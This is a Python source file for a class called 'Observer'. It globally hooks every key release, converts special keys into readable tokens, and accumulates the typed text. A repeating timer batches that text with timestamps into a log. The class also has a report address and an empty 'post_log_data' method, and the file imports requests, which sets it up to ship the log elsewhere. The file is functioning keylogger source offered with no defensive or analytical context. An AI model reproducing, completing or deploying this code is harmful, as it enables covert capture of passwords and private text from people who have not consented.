import keyboard
from threading import Timer
from datetime import datetime
import requests
import time


class Observer:
    
    def __init__(self, interval, repport_address=''):
        self.interval = interval
        self.repport_address = repport_address
        self.content = ''
        self.start_dt = int(time.time())
        self.end_dt = None
        self.log = {
            'start_date': self.start_dt,
            'end_date': self.end_dt,
            'content': '',
        }
        self.backup = list()
        
    
    def callback(self, event):
        
        name = event.name
        if len(name) > 1:
            if name == 'space':
                name = ' '
            elif name == 'enter':
                name = '[ENTER]\n'
            elif name == 'decimal':
                name = '.'
            else:
                name = name.replace(' ', '_')
                name = f'[{name.upper()}]'
                
        self.content += name

    def post_log_data(self, data):
        pass

    def update_log(self):
        self.end_dt = int(time.time())
        self.log['end_date'] = self.end_dt
        self.log['content'] = self.content

    def send_log(self):
        if self.content:
            self.update_log()
            print(self.log)
            self.post_log_data(self.log)
            self.start_dt = int(time.time())

        self.content= ''
        timer = Timer(interval=self.interval, function=self.send_log)
        timer.daemon = True
        timer.start()


    def start(self):
        self.start_dt = int(time.time())
        keyboard.on_release(callback=self.callback)
        self.send_log()
        keyboard.wait()